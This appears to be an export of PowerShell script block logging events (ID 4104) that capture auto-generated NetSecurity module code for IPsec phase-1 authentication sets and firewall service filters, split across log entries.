    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Proposal')) {
            [object]$__cmdletization_value = ${Proposal}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecPhase1AuthSet' -Alias '*'
        

function Remove-NetIPsecPhase1AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation

ScriptBlock ID: b5b61c19-5fee-4904-981e-261652386372
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 4):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIKEP1AuthSet'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecPhase1AuthSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('ID')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${DisplayName},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${Group},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${Default},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InstanceID'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisplayName')) {
          [object]$__cmdletization_value = ${DisplayName}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Description')) {
          [object]$__cmdletization_value = ${Description}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Group')) {
          [object]$__cmdletization_value = ${Group}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RuleGroup'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Proposal')) {
          [object]$__cmdletization_value = ${Proposal}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Default')) {
          [object]$__cmdletization_value = ${Default}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:Default'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecPhase1AuthSet' -Alias '*'
        

function Get-NetIPsecPhase1AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
  

ScriptBlock ID: b5b61c19-5fee-4904-981e-261652386372
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetServiceFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallServiceFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetServiceFilter')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Service},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
